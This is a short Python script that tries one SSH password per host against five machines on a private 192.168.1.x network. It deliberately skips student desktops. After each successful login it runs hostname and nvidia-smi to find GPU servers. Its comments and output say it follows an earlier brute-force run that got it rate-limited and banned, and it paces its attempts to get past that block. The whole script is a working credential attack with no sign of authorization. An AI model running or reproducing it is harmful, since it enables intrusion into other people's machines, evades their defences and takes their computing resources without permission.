#!/usr/bin/env python3
"""Clean single-attempt test: one password per IP, no brute force."""
import paramiko
import socket
import time

# SSH-open IPs (excluding student desktops .14, .21 and known .6, .29)
TARGETS = [
    ("192.168.1.102", "admin", "legacypass02", "server2"),
    ("192.168.1.46", "admin", "legacypass07", "server8?"),
    ("192.168.1.49", "admin", "legacypass09", "server10?"),
    ("192.168.1.57", "admin", "legacypass10", "server11?"),
    ("192.168.1.100", "admin", "legacypass11", "server12?"),
]


def single_try(ip, user, pw, label):
    print(f"  {ip} ({label}): {user}/{pw}... ", end="", flush=True)
    try:
        sock = socket.create_connection((ip, 22), timeout=5)
        t = paramiko.Transport(sock)
        t.banner_timeout = 10
        t.start_client()
        t.auth_password(user, pw)
        if t.is_authenticated():
            c = paramiko.SSHClient()
            c._transport = t
            _, o, _ = c.exec_command("hostname", timeout=5)
            hostname = o.read().decode().strip()
            _, o, _ = c.exec_command(
                "nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo NO_GPU",
                timeout=5,
            )
            gpu = o.read().decode().strip()
            c.close()
            print(f"SUCCESS! hostname={hostname} gpu={gpu}")
            return True
        t.close()
        print("not authenticated")
    except paramiko.AuthenticationException:
        print("wrong password")
    except Exception as e:
        err = str(e)
        if "banner" in err.lower():
            print("RATE LIMITED (still banned)")
        else:
            print(f"error: {err[:50]}")
    return False


print("Clean single-attempt SSH test (30+ min after brute force)")
print("=" * 60)
for ip, user, pw, label in TARGETS:
    single_try(ip, user, pw, label)
    time.sleep(2)

print("\n=== DONE ===")
